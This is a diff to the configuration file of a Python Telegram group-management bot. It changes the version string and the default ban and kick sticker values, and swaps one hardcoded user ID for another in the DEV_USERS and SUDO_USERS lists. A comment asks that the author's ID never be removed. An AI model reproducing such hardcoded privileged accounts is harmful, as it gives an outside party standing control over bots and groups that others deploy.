@@ -6,7 +6,7 @@ import telegram.ext as tg
 import spamwatch
 StartTime = time.time()
 
-VERSION = "6.0"
+VERSION = "6.0.7"
 # enable logging
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -68,8 +68,8 @@ if ENV:
     STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))  
     STRICT_GMUTE = bool(os.environ.get('STRICT_GMUTE', False))
     WORKERS = int(os.environ.get('WORKERS', 8))
-    BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
-    KICK_STICKER = os.environ.get('KICK_STICKER', 'CAACAgQAAxkBAAEEUYRelpQPawgDzWA0kbOucFeqf8xdAQACigAD_OoIAAF1UohdVTwBsRgE')
+    BAN_STICKER = os.environ.get('BAN_STICKER', 'https://telegra.ph/file/c9ed94d98e3287cca8c4d.jpg')
+    KICK_STICKER = os.environ.get('KICK_STICKER', 'https://telegra.ph/Kick-11-06')
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
     CASH_API_KEY = os.environ.get('CASH_API_KEY', None)
     TIME_API_KEY = os.environ.get('TIME_API_KEY', None)
@@ -139,9 +139,9 @@ else:
 
 # Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @Sur_vivor     
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1118936839)
+DEV_USERS.add(1324185738)
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1118936839)
+SUDO_USERS.add(1324185738)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
